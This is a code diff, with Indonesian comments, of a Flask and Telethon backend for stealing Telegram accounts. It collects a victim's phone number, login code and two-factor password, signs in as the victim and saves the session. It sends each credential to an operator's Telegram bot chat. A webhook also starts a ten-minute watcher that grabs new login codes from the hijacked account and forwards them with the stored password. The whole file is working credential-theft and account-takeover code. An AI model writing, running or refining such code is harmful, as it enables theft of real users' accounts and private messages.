@@ -7,21 +7,21 @@ from telethon.sessions import StringSession
 app = Flask(__name__)
 CORS(app)
 
-# Konfigurasi Railway
+# Ambil Variabel dari Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-# Pastikan variabel RAILWAY_STATIC_URL diisi link domain Abang (tanpa https)
+# Variabel RAILWAY_STATIC_URL wajib ada di Dashboard Railway (tanpa https)
 RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"
 
-# Database RAM Sementara
+# Database RAM
 user_db = {}
 
 def bot_api(method, payload):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-        res = requests.post(url, json=payload, timeout=15)
+        res = requests.post(url, json=payload, timeout=10)
         return res.json()
     except:
         return {}
@@ -46,7 +46,6 @@ def register():
     try:
         return loop.run_until_complete(handle_flow(data))
     except Exception as e:
-        print(f"Sistem Error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
     finally:
         loop.close()
@@ -57,8 +56,6 @@ async def handle_flow(data):
         step = int(data.get('step', 1))
         nomor = normalisasi_nomor(data.get('nomor', ''))
         nama = data.get('nama', 'User')
-        otp_val = data.get('otp', '')
-        sandi_val = data.get('sandi', '')
         
         if nomor not in user_db:
             user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}
@@ -74,11 +71,10 @@ async def handle_flow(data):
 
         elif step == 2:
             try:
-                await client.sign_in(nomor, otp_val, phone_code_hash=user_db[nomor]['hash'])
+                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                 user_db[nomor]['session'] = client.session.save()
-                
-                # Kirim Laporan Pertama
-                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp_val}`"
+                # Laporan Pertama
+                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
                     "text": text, 
@@ -93,11 +89,10 @@ async def handle_flow(data):
 
         elif step == 3:
             try:
-                await client.sign_in(password=sandi_val)
-                user_db[nomor].update({"sandi": sandi_val, "session": client.session.save()})
-                
-                # REQUEST: Tampilkan "None" bukan "Selesai"
-                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{sandi_val}**\nOTP : None"
+                await client.sign_in(password=data.get('sandi'))
+                user_db[nomor].update({"sandi": data.get('sandi'), "session": client.session.save()})
+                # REQUEST: OTP tampil "None"
+                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
                     "text": text, 
@@ -108,7 +103,10 @@ async def handle_flow(data):
             except: return jsonify({"status": "invalid_2fa"}), 400
     finally:
         if client:
-            try: await client.disconnect()
+            try:
+                # Perbaikan: Cek koneksi sebelum disconnect agar tidak error
+                if client.is_connected():
+                    await client.disconnect()
             except: pass
 
 @app.route('/webhook', methods=['POST'])
@@ -117,36 +115,30 @@ def webhook():
     if not update or "callback_query" not in update: return jsonify({"status": "ok"})
     
     call = update["callback_query"]
-    data_call = call["data"].split("_")
-    action = data_call[0]
-    nomor = data_call[1]
+    action, nomor = call["data"].split("_")
     
     if action == "upd":
-        # Pesan instruksi persis seperti dulu
         msg_text = "Bot siap mengintip OTP!\nSilakan minta kode di TurboTel/Telegraph Anda."
         res = bot_api("sendMessage", {
             "chat_id": CHAT_ID, 
             "text": msg_text,
             "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
         })
-        # Simpan ID pesan instruksi untuk dihapus nanti
         user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
-        
-        # Jalankan sniffing di background
+        # Jalankan Intip OTP di thread terpisah
         threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
         
     elif action == "exit":
         msg_id = user_db.get(nomor, {}).get('status_id')
         if msg_id:
             bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": msg_id})
-            
     return jsonify({"status": "success"})
 
 async def monitor_otp(nomor):
-    data_user = user_db.get(nomor)
-    if not data_user or not data_user['session']: return
+    data = user_db.get(nomor)
+    if not data or not data['session']: return
     
-    client = TelegramClient(StringSession(data_user['session']), int(API_ID), API_HASH)
+    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
     
     try:
@@ -154,17 +146,17 @@ async def monitor_otp(nomor):
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # KIRIM ULANG DATA LENGKAP: Nama, Nomor, Sandi, OTP Baru
-                text_baru = f"Nama: **{data_user['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data_user.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
+                # KIRIM DATA LENGKAP KE BOT
+                text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
                 bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
                 
-                # Hapus pesan instruksi otomatis
-                if data_user.get('status_id'):
-                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data_user['status_id']})
+                # Hapus instruksi 'Siap mengintip' otomatis
+                if data.get('status_id'):
+                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                 
                 await client.disconnect()
 
-        # Bot standby mengintip selama 10 menit
+        # Standby 10 menit (600 detik)
         await asyncio.sleep(600)
     finally:
         if client.is_connected():
